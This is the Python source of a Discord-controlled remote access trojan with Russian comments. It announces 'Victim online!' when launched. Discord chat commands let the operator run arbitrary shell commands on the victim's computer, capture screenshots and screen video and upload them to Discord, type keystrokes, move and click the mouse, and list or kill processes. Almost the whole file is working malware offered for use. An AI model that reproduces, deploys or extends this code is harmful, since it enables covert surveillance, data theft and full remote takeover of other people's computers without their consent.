'''Made by NullifiedVlad 
   ты не станешь крутым программистом если
   просто скопируешь его!'''


import discord
from discord.ext import commands
import pyautogui as pg
import os
import sys
import subprocess
import numpy as np
import cv2
import config
from datetime import datetime


pg.FAILSAFE = False
bot = commands.Bot(command_prefix='!') # префикс для комманд
channel = bot.get_channel(config.channel) # введите id канала в который должен писать бот
bot.remove_command('help')


@bot.event 
async def on_ready():
    channel = bot.get_channel(config.channel)
    await channel.send(f'CAT: Жертва онлайн!')
    date =  datetime.now()
    await bot.change_presence(activity=discord.Game(f'Был звпущен в {date.hour}:{date.minute}'))

@bot.command()
async def status(ctx):
    await ctx.send(f'ОС: {sys.platform}')
    
@bot.command()
async def move(ctx,x,y,time): # перемещение курсора
    pg.moveTo(int(x),int(y),float(time))
    await ctx.send('CAT: Курсор был передвинут на X:' + str(x) +' Y:' + str(y))


@bot.command()
async def click(ctx): # кликнуть мышкой
    await ctx.send('CAT: Был сделан клик!')
    pg.click()


@bot.command()
async def screenshot(ctx): # сделать скриншот
    pg.screenshot('screenshot.png')
    await ctx.send(file=discord.File('screenshot.png'))
    os.remove('screenshot.png' )


@bot.command()
async def changelanguage(ctx): #смена раскладки
    pg.hotkey('alt','shift')
    await ctx.send('CAT: Раскладка клавиатуры успешно изменена!')

@bot.command()
async def write(ctx,*,text): # написать текс
    pg.typewrite(text)
    await ctx.send(f"CAT: Был набран текст: {text}")


@bot.command()
async def send(ctx,key,how_many): #нажать клавишу
    a = 0
    while a <= int(how_many):
        pg.press(key)
        a += 1
    await ctx.send(f'CAT: Была нажата клавиша "{key}" {how_many} раза!')

@bot.command()
async def help(ctx):
    await ctx.send(config.helpmessage,file=discord.File('Banners/Banner.png'))
    
@bot.command()
async def command(ctx,*,command):
    output = os.system(str(command))
    if output == 0:
        await ctx.send('CAT: Комманда успешно выполнена!')
    else:
        await ctx.send('CAT: Ошибка выполения!')


@bot.command()
async def kill(ctx,*,process):
    output = os.system(f'taskkill /im {str(process)} /f')
    if output == 0:
        await ctx.send('CAT: Процесс успешно убит!')
    else:
        await ctx.send('CAT: Такого процесса нет!')
@bot.command()
async def processlist(ctx):
    await ctx.send(subprocess.check_output(['tasklist']))


@bot.command()
async def video(ctx,how_many): #запись видео
    output = 'video.avi'
    img = pg.screenshot()
    img = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
    height, width, channels = img.shape
    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
    out = cv2.VideoWriter(output, fourcc, 20.0, (width, height))
    loop = 0

    while int(loop) <= int(how_many):
        try:
            img = pg.screenshot()
            image = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
            out.write(image)
            StopIteration(0.5)
            loop += 1
        except KeyboardInterrupt:
            break
    await ctx.send(file=discord.File('video.avi'))

    os.remove(output)
    out.release()
    cv2.destroyAllWindows()
bot.run(config.token)
